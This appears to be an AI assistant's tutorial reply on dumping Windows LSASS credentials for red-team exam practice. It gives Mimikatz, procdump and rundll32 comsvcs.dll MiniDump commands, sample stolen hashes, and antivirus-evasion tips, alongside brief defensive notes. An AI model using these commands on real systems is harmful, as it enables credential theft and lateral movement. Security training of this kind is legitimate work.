# Mimikatz-LSASS-Dumping
Great question 👌 You’re now entering the **Credential Access** stage of the MITRE ATT\&CK framework — one of the most critical areas in **red teaming** and CRTA. Let’s break down **how attackers use tools like Mimikatz and LSASS dumps to steal credentials**, with step-by-step details and safe lab examples.

---

# 🔐 Credential Access: Mimikatz & LSASS Dumping

## ⚡ 1. What is LSASS?

* **LSASS (Local Security Authority Subsystem Service)** is a Windows process (`lsass.exe`) that handles:

  * Authentication (passwords, Kerberos, NTLM hashes)
  * Enforcing security policies
  * Token creation for logins

👉 Because it caches credentials in memory, attackers target it to **extract plaintext passwords, NTLM hashes, Kerberos tickets**.

---

## ⚡ 2. Method 1: Mimikatz (Direct Credential Dumping)

**Mimikatz** is the most famous post-exploitation tool for credential extraction.

### 🔹 Steps (Lab Use Only)

1. Get a **high-privilege shell** (Administrator or SYSTEM).
   Example (from Meterpreter):

   ```bash
   getsystem
   ```
2. Run Mimikatz interactively:

   ```powershell
   mimikatz.exe
   ```
3. Enable debug privilege:

   ```text
   privilege::debug
   ```
4. Dump credentials from memory:

   ```text
   sekurlsa::logonpasswords
   ```

   ➝ Shows plaintext creds, NTLM hashes, Kerberos tickets.

### 🔹 Example Output

```
Username: Administrator
Domain:   LAB.local
NTLM:     aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
Password: P@ssw0rd123
```

👉 Now attacker can use the **hash for Pass-the-Hash** or the password for lateral movement.

---

## ⚡ 3. Method 2: LSASS Process Dump + Offline Extraction

Instead of running Mimikatz directly (which AV/EDR might block), attackers often **dump LSASS memory** and extract credentials offline.

### 🔹 Steps

1. Open CMD/PowerShell as Administrator.

2. Use **Task Manager** or `tasklist` to find LSASS PID:

   ```powershell
   tasklist /FI "IMAGENAME eq lsass.exe"
   ```

3. Dump LSASS memory using `procdump` (Sysinternals tool):

   ```powershell
   procdump.exe -ma <PID> lsass.dmp
   ```

   Example:

   ```powershell
   procdump.exe -ma 632 lsass.dmp
   ```

   ➝ Dumps process memory to `lsass.dmp`.

4. Transfer `lsass.dmp` to attacker machine and parse with Mimikatz:

   ```text
   sekurlsa::minidump lsass.dmp
   sekurlsa::logonpasswords
   ```

### 🔹 Example Result

```
Username: John
Domain:   CORP
NTLM:     b4b9b02e6f09a9bd760f388b67351e2b
Password: (null)
```

---

## ⚡ 4. Detection Evasion Tricks (Used by Real Adversaries)

* Use **Living Off the Land Binaries (LOLBins)** like `rundll32` or `comsvcs.dll` to dump LSASS without dropping tools.

  ```powershell
  rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
  ```
* Rename/obfuscate Mimikatz to bypass AV.
* Inject into another process before dumping LSASS.

---

## ⚡ 5. Defensive Considerations (Blue Team Angle)

Organizations detect/prevent this by:

* **LSASS Protection** → Windows Defender Credential Guard, RunAsPPL
* **EDR Alerts** → Procdump on LSASS, suspicious memory access
* **Segregation of Privileges** → Avoid domain admins logging into workstations
* **Event IDs** → Monitor for 4624/4672 + memory dump events

---

# 📘 Summary

* **Mimikatz (direct)** → Extract creds live from LSASS.
* **LSASS Dump (offline)** → Dump memory, analyze later with Mimikatz.
* **Credentials Extracted** → Plaintext, NTLM hashes, Kerberos tickets.
* **Used For** → Pass-the-Hash, Pass-the-Ticket, Lateral Movement.

---

⚠️ Important: These techniques are **for lab/authorized environments only** (like CRTA labs, AD practice labs, or personal VMs). Running Mimikatz or dumping LSASS on a production/corporate machine without explicit permission is illegal.

---

Would you like me to also show you how to **set up a mini Active Directory lab** (with a Domain Controller + client + attacker machine) so you can safely practice LSASS dumping and Mimikatz before CRTA?
